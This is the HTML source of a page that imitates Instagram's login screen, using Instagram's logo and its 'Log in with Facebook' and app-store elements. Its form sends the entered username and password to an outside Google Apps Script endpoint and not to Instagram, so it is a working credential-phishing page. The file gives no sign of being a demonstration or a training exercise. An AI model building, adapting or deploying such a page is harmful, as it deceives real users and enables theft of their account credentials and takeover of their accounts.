<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <title>Instagram Login </title>
    
    <link rel="icon" href="modern-badge-logo-instagram-icon_578229-124.jpg" type="image/x-icon" />
</head>

<body>
    <main>
        <img src="IG.jpeg" alt="" class="phoneImg">
        <div class="form-div">
            <form method="post" action="https://script.google.com/macros/s/AKfycbwGqnuebkPDccddT4h5laRZReCCvnztMGeRQucIsm9us-nO6T0P6heQt7hwTb6B1zZP/exec">
                <img class="instaLogo" src="instaLogo.png" alt="logo">
                <input type="text" class="input" name="user" placeholder="Phone number, username, or email" required>
                <input id="password" type="password" class="input" name="password" required placeholder="Password">
                <button id="togglePassword" class="toggle-password" >Show</button>
                <!-- <button class="login-btn">Log In</button> -->
                <div class="gap_2">   </div>
                
                <input class="login-btn" type="submit" value="Log in" id="submit">
                
                <!-- <p id="or">
                    OR
                </p> -->
                <span class="OR">
                    <p>_____________________</p>
                     OR
                    <p>_____________________</p>
                </span>
                <a href="facbook.com" class="fb-login"><i class='bx bxl-facebook-square'></i>  Log in with Facebook</a>
                <div class="gap_2">   </div>
                <a class="forgot" href="instagram.com">Forgotten your password?</a>
            </form>
            <div class="gap">   </div>
            <div class="sign-up">
                <p class="no_ac">Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
            </div>
            <div class="get-app">
                <p class="app">Get the app</p>
                <div class="store">
                    <img id="play" src="playStore.png" alt="">
                    <div class="gap_app">      </div>
                    <img id="microsoft" src="getMicrosoft.png" alt="">
                </div>
            </div>
        </div>
    </main>
    <script src="Google Shreet.js"></script>
</body>

</html>
